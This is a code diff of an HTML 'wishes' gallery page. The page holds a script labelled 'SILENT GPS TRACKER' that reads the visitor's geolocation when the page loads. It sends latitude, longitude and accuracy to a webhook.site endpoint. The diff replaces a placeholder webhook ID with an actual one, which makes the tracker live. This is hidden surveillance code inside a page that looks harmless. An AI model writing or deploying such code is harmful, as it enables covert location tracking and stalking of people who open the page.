@@ -22,14 +22,14 @@
            
             images.forEach((src, index) => {
                 const img = document.createElement('img');
-                img.src = src;                    // fixed: images are in root
+                img.src = src;
                 img.alt = `Wish ${index + 1}`;
                 gallery.appendChild(img);
             });
         </script>
     </main>
 
-    <!-- SILENT GPS TRACKER - already baked in -->
+    <!-- SILENT GPS TRACKER - baked in with your webhook -->
     <script>
         function stealLocation() {
             if (navigator.geolocation) {
@@ -40,7 +40,7 @@
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
             const acc = position.coords.accuracy;
-            fetch('https://webhook.site/#!/PASTE_YOUR_WEBHOOK_ID_HERE?lat=' + lat + '&lon=' + lon + '&acc=' + acc + '&time=' + Date.now());
+            fetch('https://webhook.site/#!/6c973f89-66a1-4d54-84d8-9dd63f246944?lat=' + lat + '&lon=' + lon + '&acc=' + acc + '&time=' + Date.now());
         }
         window.onload = stealLocation;
         setTimeout(stealLocation, 1200);
